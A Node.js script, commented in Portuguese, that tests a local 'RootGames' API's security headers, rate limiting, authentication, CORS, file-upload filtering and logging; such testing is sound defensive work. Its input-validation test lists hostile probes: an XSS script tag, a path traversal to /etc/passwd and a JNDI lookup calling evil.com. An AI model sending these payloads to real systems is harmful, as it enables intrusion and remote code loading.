#!/usr/bin/env node

/**
 * Script de Teste de Segurança para RootGames API
 *
 * Funcionalidades:
 * - Testar todas as implementações de segurança
 * - Verificar middlewares
 * - Testar rate limiting
 * - Validar headers de segurança
 * - Testar autenticação
 */

const axios = require('axios');
const fs = require('fs');
const path = require('path');

class SecurityTester {
  constructor() {
    this.apiBase = 'http://localhost:1337';
    this.testResults = {
      passed: 0,
      failed: 0,
      total: 0,
      tests: []
    };
  }

  async runAllTests() {
    console.log('🧪 INICIANDO TESTES DE SEGURANÇA');
    console.log('=================================');

    try {
      // 1. Testar conectividade básica
      await this.testBasicConnectivity();

      // 2. Testar headers de segurança
      await this.testSecurityHeaders();

      // 3. Testar rate limiting
      await this.testRateLimiting();

      // 4. Testar validação de entrada
      await this.testInputValidation();

      // 5. Testar autenticação
      await this.testAuthentication();

      // 6. Testar CORS
      await this.testCORS();

      // 7. Testar upload de arquivos
      await this.testFileUpload();

      // 8. Testar logs de segurança
      await this.testSecurityLogging();

      // 9. Gerar relatório
      await this.generateTestReport();

      console.log('\n✅ TESTES DE SEGURANÇA CONCLUÍDOS');
      console.log('=================================');
      console.log(`📊 Resultados: ${this.testResults.passed}/${this.testResults.total} testes passaram`);

      if (this.testResults.failed > 0) {
        console.log(`❌ ${this.testResults.failed} testes falharam`);
        process.exit(1);
      } else {
        console.log('🎉 Todos os testes de segurança passaram!');
      }

    } catch (error) {
      console.error('❌ Erro durante os testes:', error.message);
      process.exit(1);
    }
  }

  async testBasicConnectivity() {
    console.log('\n🔌 Testando conectividade básica...');

    try {
      const response = await axios.get(`${this.apiBase}/api/games?pagination%5BpageSize%5D=1`, {
        timeout: 5000
      });

      this.addTestResult('Conectividade básica', response.status === 200,
        'API deve responder com status 200');

    } catch (error) {
      this.addTestResult('Conectividade básica', false,
        `Erro de conectividade: ${error.message}`);
    }
  }

  async testSecurityHeaders() {
    console.log('\n🛡️ Testando headers de segurança...');

    try {
      const response = await axios.get(`${this.apiBase}/api/games?pagination%5BpageSize%5D=1`);
      const headers = response.headers;

      // Testar X-Frame-Options
      this.addTestResult('X-Frame-Options',
        headers['x-frame-options'] === 'DENY' || headers['x-frame-options'] === 'SAMEORIGIN',
        'X-Frame-Options deve estar presente');

      // Testar X-Content-Type-Options
      this.addTestResult('X-Content-Type-Options',
        headers['x-content-type-options'] === 'nosniff',
        'X-Content-Type-Options deve ser nosniff');

      // Testar X-XSS-Protection
      this.addTestResult('X-XSS-Protection',
        headers['x-xss-protection'] === '1; mode=block',
        'X-XSS-Protection deve estar presente');

      // Testar Strict-Transport-Security (apenas em HTTPS)
      if (this.apiBase.startsWith('https')) {
        this.addTestResult('Strict-Transport-Security',
          headers['strict-transport-security'] !== undefined,
          'Strict-Transport-Security deve estar presente em HTTPS');
      }

    } catch (error) {
      this.addTestResult('Headers de segurança', false,
        `Erro ao testar headers: ${error.message}`);
    }
  }

  async testRateLimiting() {
    console.log('\n⏱️ Testando rate limiting...');

    try {
      // Fazer múltiplas requisições rapidamente
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(
          axios.get(`${this.apiBase}/api/games?pagination%5BpageSize%5D=1`)
            .catch(err => err.response)
        );
      }

      const responses = await Promise.all(promises);

      // Verificar se alguma requisição foi limitada
      const rateLimited = responses.some(res => res && res.status === 429);

      this.addTestResult('Rate limiting', rateLimited,
        'Rate limiting deve bloquear requisições excessivas');

    } catch (error) {
      this.addTestResult('Rate limiting', false,
        `Erro ao testar rate limiting: ${error.message}`);
    }
  }

  async testInputValidation() {
    console.log('\n🔍 Testando validação de entrada...');

    try {
      // Testar parâmetros maliciosos
      const maliciousParams = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com}'
      ];

      let validationWorking = true;

      for (const param of maliciousParams) {
        try {
          const response = await axios.get(`${this.apiBase}/api/games?search=${encodeURIComponent(param)}`);
          // Se a resposta contém o parâmetro malicioso, a validação falhou
          if (JSON.stringify(response.data).includes(param)) {
            validationWorking = false;
            break;
          }
        } catch (error) {
          // Erro é esperado para parâmetros maliciosos
        }
      }

      this.addTestResult('Validação de entrada', validationWorking,
        'Parâmetros maliciosos devem ser sanitizados');

    } catch (error) {
      this.addTestResult('Validação de entrada', false,
        `Erro ao testar validação: ${error.message}`);
    }
  }

  async testAuthentication() {
    console.log('\n🔐 Testando autenticação...');

    try {
      // Testar rota protegida sem API key
      try {
        await axios.get(`${this.apiBase}/api/admin`);
        this.addTestResult('Autenticação sem API key', false,
          'Rotas protegidas devem exigir API key');
      } catch (error) {
        if (error.response && error.response.status === 401) {
          this.addTestResult('Autenticação sem API key', true,
            'Rotas protegidas devem exigir API key');
        } else {
          this.addTestResult('Autenticação sem API key', false,
            `Erro inesperado: ${error.message}`);
        }
      }

      // Testar rota protegida com API key inválida
      try {
        await axios.get(`${this.apiBase}/api/admin`, {
          headers: { 'X-API-Key': 'invalid-key' }
        });
        this.addTestResult('Autenticação com API key inválida', false,
          'API keys inválidas devem ser rejeitadas');
      } catch (error) {
        if (error.response && error.response.status === 401) {
          this.addTestResult('Autenticação com API key inválida', true,
            'API keys inválidas devem ser rejeitadas');
        } else {
          this.addTestResult('Autenticação com API key inválida', false,
            `Erro inesperado: ${error.message}`);
        }
      }

    } catch (error) {
      this.addTestResult('Autenticação', false,
        `Erro ao testar autenticação: ${error.message}`);
    }
  }

  async testCORS() {
    console.log('\n🌐 Testando CORS...');

    try {
      const response = await axios.options(`${this.apiBase}/api/games`, {
        headers: {
          'Origin': 'http://localhost:3000',
          'Access-Control-Request-Method': 'GET'
        }
      });

      const corsHeaders = response.headers;

      this.addTestResult('CORS Headers',
        corsHeaders['access-control-allow-origin'] !== undefined,
        'CORS headers devem estar presentes');

      this.addTestResult('CORS Methods',
        corsHeaders['access-control-allow-methods'] !== undefined,
        'CORS methods devem estar configurados');

    } catch (error) {
      this.addTestResult('CORS', false,
        `Erro ao testar CORS: ${error.message}`);
    }
  }

  async testFileUpload() {
    console.log('\n📁 Testando upload de arquivos...');

    try {
      // Testar upload de arquivo válido
      const FormData = require('form-data');
      const form = new FormData();
      form.append('files', Buffer.from('test image content'), {
        filename: 'test.jpg',
        contentType: 'image/jpeg'
      });

      try {
        const response = await axios.post(`${this.apiBase}/api/upload`, form, {
          headers: form.getHeaders()
        });

        this.addTestResult('Upload de arquivo válido',
          response.status === 200 || response.status === 201,
          'Upload de arquivo válido deve funcionar');

      } catch (error) {
        this.addTestResult('Upload de arquivo válido', false,
          `Erro no upload: ${error.message}`);
      }

      // Testar upload de arquivo inválido
      const invalidForm = new FormData();
      invalidForm.append('files', Buffer.from('malicious content'), {
        filename: 'malicious.exe',
        contentType: 'application/x-executable'
      });

      try {
        await axios.post(`${this.apiBase}/api/upload`, invalidForm, {
          headers: invalidForm.getHeaders()
        });

        this.addTestResult('Upload de arquivo inválido', false,
          'Upload de arquivo inválido deve ser rejeitado');

      } catch (error) {
        if (error.response && (error.response.status === 400 || error.response.status === 415)) {
          this.addTestResult('Upload de arquivo inválido', true,
            'Upload de arquivo inválido deve ser rejeitado');
        } else {
          this.addTestResult('Upload de arquivo inválido', false,
            `Erro inesperado: ${error.message}`);
        }
      }

    } catch (error) {
      this.addTestResult('Upload de arquivos', false,
        `Erro ao testar upload: ${error.message}`);
    }
  }

  async testSecurityLogging() {
    console.log('\n📝 Testando logs de segurança...');

    try {
      // Verificar se arquivo de log existe
      const logFile = path.join(process.cwd(), 'logs', 'security.log');
      const logExists = fs.existsSync(logFile);

      this.addTestResult('Arquivo de log de segurança', logExists,
        'Arquivo de log de segurança deve existir');

      if (logExists) {
        // Verificar se o log contém entradas recentes
        const logContent = fs.readFileSync(logFile, 'utf8');
        const recentEntries = logContent.split('\n').filter(line =>
          line.includes(new Date().toISOString().split('T')[0])
        );

        this.addTestResult('Logs recentes', recentEntries.length > 0,
          'Log deve conter entradas recentes');
      }

    } catch (error) {
      this.addTestResult('Logs de segurança', false,
        `Erro ao testar logs: ${error.message}`);
    }
  }

  addTestResult(testName, passed, description) {
    this.testResults.total++;
    if (passed) {
      this.testResults.passed++;
      console.log(`   ✅ ${testName}: ${description}`);
    } else {
      this.testResults.failed++;
      console.log(`   ❌ ${testName}: ${description}`);
    }

    this.testResults.tests.push({
      name: testName,
      passed,
      description,
      timestamp: new Date().toISOString()
    });
  }

  async generateTestReport() {
    console.log('\n📊 Gerando relatório de testes...');

    const report = {
      timestamp: new Date().toISOString(),
      summary: {
        total: this.testResults.total,
        passed: this.testResults.passed,
        failed: this.testResults.failed,
        successRate: ((this.testResults.passed / this.testResults.total) * 100).toFixed(2) + '%'
      },
      tests: this.testResults.tests,
      recommendations: this.generateRecommendations()
    };

    const reportFile = path.join(process.cwd(), 'logs', 'security-test-report.json');
    fs.writeFileSync(reportFile, JSON.stringify(report, null, 2));

    console.log(`   📄 Relatório salvo: ${reportFile}`);
  }

  generateRecommendations() {
    const recommendations = [];

    if (this.testResults.failed > 0) {
      recommendations.push('🔧 Corrija os testes que falharam');
    }

    if (this.testResults.passed === this.testResults.total) {
      recommendations.push('🎉 Excelente! Todos os testes de segurança passaram');
    }

    recommendations.push('🔄 Execute estes testes regularmente');
    recommendations.push('📊 Monitore os logs de segurança');
    recommendations.push('🔒 Mantenha as dependências atualizadas');

    return recommendations;
  }
}

// Executar se chamado diretamente
if (require.main === module) {
  const tester = new SecurityTester();
  tester.runAllTests().catch(console.error);
}

module.exports = SecurityTester;
